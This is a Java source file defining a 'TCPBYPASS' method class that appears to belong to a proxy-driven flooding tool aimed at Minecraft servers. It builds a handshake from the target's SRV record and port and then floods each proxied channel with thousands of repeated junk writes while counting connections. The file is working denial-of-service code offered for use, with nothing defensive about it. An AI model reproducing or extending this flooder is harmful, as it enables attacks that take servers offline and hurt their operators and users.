package IO.SYVERIS.methods;

import IO.SYVERIS.Main;
import IO.SYVERIS.utils.Handshake;
import IO.SYVERIS.utils.NettyBootstrap;
import IO.SYVERIS.utils.PacketUtils;
import IO.SYVERIS.utils.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.util.zip.Deflater;

public class TCPBYPASS implements Method {
   private Handshake handshake;
   private byte[] bytes;

   public TCPBYPASS() {
      this.handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
      this.bytes = this.handshake.getWrappedPacket();
   }

   public void accept(Channel channel, ProxyLoader.Proxy proxy) {
      ByteBuf b = Unpooled.buffer();
      ByteBufOutputStream bbbb = new ByteBufOutputStream(b);

      try {
         for(int i = 0; i < 20; ++i) {
            for(boolean var6 = false; i < 2300; ++i) {
               bbbb.write(0);
               bbbb.write(-1);
               bbbb.write(2626);
               bbbb.write(0);
               bbbb.write(-6);
               bbbb.write(13950);
               bbbb.writeBytes(Main.srvRecord);
               bbbb.writeUTF(Main.srvRecord);
               bbbb.write(0);
               bbbb.write(-1);
               bbbb.write(2626);
               bbbb.write(0);
               bbbb.write(-6);
               bbbb.write(13950);
               bbbb.writeBytes(Main.srvRecord);
               bbbb.writeUTF(Main.srvRecord);
            }
         }
      } catch (IOException var7) {
         var7.printStackTrace();
      }

      channel.writeAndFlush(b);
      channel.writeAndFlush(bbbb);
      ++NettyBootstrap.integer;
      ++NettyBootstrap.totalConnections;
   }

   public byte[] compress(byte[] packet, int threshold) throws IOException {
      ByteArrayOutputStream bytes = new ByteArrayOutputStream();
      DataOutputStream out = new DataOutputStream(bytes);
      byte[] buffer = new byte[8192];
      if (packet.length >= threshold && threshold > 0) {
         byte[] data = new byte[packet.length];
         System.arraycopy(packet, 0, data, 0, packet.length);
         PacketUtils.writeVarInt(out, data.length);
         Deflater def = new Deflater();
         def.setInput(data, 0, data.length);
         def.finish();

         while(!def.finished()) {
            int i = def.deflate(buffer);
            out.write(buffer, 0, i);
         }

         def.reset();
      } else {
         PacketUtils.writeVarInt(out, 0);
         out.write(packet);
      }

      out.close();
      return bytes.toByteArray();
   }

   public static void writePacket(byte[] packetData, ByteBufOutputStream out) throws IOException {
      writeVarInt(packetData.length, out);
      out.write(packetData);
   }

   public static void writeVarInt(int value, ByteBufOutputStream out) throws IOException {
      while((value & -128) != 0) {
         out.writeByte(value & 127 | 128);
         value >>>= 7;
      }

      out.writeByte(value);
   }
}
